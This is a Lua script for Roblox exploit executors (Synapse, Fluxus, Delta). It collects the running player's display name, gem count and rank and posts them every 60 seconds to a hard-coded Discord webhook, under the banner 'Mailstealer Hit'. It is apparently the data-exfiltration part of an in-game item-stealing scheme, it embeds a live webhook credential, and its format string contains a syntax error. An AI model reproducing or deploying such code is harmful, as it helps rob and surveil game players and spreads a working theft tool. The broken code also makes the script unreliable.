local WebHook = "https://discord.com/api/webhooks/1202269897640644618/Nzv-sppXD3s2-1tmOTwf1f4gxKFNs6s7GEXCtbxiaWPcpB04_Jpxh7y87bar_uyx8THO"
local Creator = "tiger12092008"

local isSynapse, isFluxus, isDelta = false, false, false

-- Detect executor
if syn then
    isSynapse = true
elseif getgenv().Fluxus then
    isFluxus = true
elseif protect_gui and protect_gui["CreateWindow"] then
    isDelta = true
end

while true do
    local displayUsername = game.Players.LocalPlayer.DisplayName

    local gemsAmount = 0
    local creatorsList = "Sen/Aasui/Sintax"
    local exclusivePet, hugePet = "N/A", "N/A"
    local playerRank = "N/A"

    -- Access the game's data to get gems, exclusive pet, huge pet, and rank information
    local playerData = game.Players.LocalPlayer
    local leaderstats = playerData:FindFirstChild("leaderstats")

    if leaderstats then
        local diamondsValue = leaderstats:FindFirstChild("Diamonds")
        local rankValue = leaderstats:FindFirstChild("Rank")  -- Adjust "Rank" to the actual name of the player rank value

        gemsAmount = diamondsValue and diamondsValue.Value or 0
        playerRank = rankValue and rankValue.Value or "N/A"
    end

    local data = {
        content = "||@everyone|| Mailstealer Hit 🎉",
        embeds = {
            {
                title = "(:penguin:) Player Info",
                description = string.format(
                    "(:lock:) Executed By: %s\n(:game_die:) Creator: %s\n(:pushpin:) Version: 1.0(beta)\n\n" ..
                    "(:cat:) Pets List\n(:gem:) Gems: "tostring(gemsAmount)," %s\n(:rocket:) Exclusive Pet: %s\n(:star:) Huge Pet: %s\n\n" ..
                    "(:crown:) Rank: %s\n(:rocket:) Creators: %s",
                    displayUsername,
                    Creator,
                    tostring(gemsAmount),
                    exclusivePet,
                    hugePet,
                    playerRank,
                    creatorsList
                ),
                type = "rich",
                color = tonumber(65311),
                fields = {} -- Add more fields if needed
            }
        }
    }

    local headers = {
        ["Content-Type"] = "application/json"
    }

    local url = WebHook
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local success, response
    if isSynapse then
        success, response = pcall(function()
            return syn.request({
                Url = url,
                Method = "POST",
                Headers = headers,
                Body = newdata
            })
        end)
    elseif isFluxus then
        -- Fluxus uses `request` method
        success, response = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = headers,
                Body = newdata
            })
        end)
    elseif isDelta then
        -- Delta uses `request` method
        success, response = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = headers,
                Body = newdata
            })
        end)
    end

    if success then
        print("Message sent successfully.")
        print("Response:", response)
    else
        warn("Failed to send message.")
        warn("Error:", response)
    end

    wait(60)
end
